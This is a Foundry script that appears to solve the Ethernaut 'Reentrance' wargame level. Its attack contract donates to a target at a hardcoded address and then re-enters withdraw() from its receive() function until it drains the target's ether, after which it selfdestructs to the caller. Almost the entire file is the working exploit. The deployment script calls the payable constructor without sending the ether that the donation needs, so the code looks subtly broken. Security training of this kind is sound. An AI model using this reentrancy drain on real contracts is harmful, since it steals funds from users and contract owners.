// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/10-Reentrancy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract AttackReentrance{

    Reentrance public reentranceInstance = Reentrance(payable(0x52Fc0A44F75d8B93Edfd8baFeAc9789798451f21));

    constructor() public payable {
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() public {
        reentranceInstance.withdraw(0.001 ether);
        require(address(reentranceInstance).balance == 0, "Reentrance failed");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 balance = min(0.001 ether, address(reentranceInstance).balance);
        if (balance > 0) {
            reentranceInstance.withdraw(balance);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}

contract ReentrancySolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // AttackReentrance attackReentrant = new AttackReentrance{value: 0.001 ether}();
        AttackReentrance attackReentrant = new AttackReentrance();
        attackReentrant.withdraw();
        vm.stopBroadcast();
    }
}